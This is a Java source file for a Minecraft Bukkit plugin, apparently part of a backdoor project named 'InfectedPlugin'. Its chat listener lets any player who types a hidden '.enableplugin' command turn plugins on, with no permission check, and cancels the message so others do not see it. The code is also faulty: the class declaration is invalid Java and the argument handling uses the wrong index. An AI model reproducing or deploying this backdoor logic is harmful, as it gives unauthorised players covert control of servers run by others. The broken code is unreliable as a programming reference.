package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.PluginManager;

public class Command_enableplugin implements Listener extends IP_Command
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = false;
        Server server = Bukkit.getServer();
        Player p = event.getPlayer();
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".enableplugin"))
            {
                if (args.length == 0)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .enableplugin <plugin>");
                }

                Plugin pl;
                try
                {
                    pl = getPlugin(args[0]);
                }
                catch (PluginNotFoundException ex)
                {
                    p.sendMessage(ChatColor.RED + ex.getMessage());
                    return;
                }
                
                if (pl != null)
                {
                    PluginManager pluginManager = pl.getServer().getPluginManager();
                    pluginManager.enablePlugin(pl);
                }
                p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
                cancel = true;
            }
        
            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
       }
    }
}
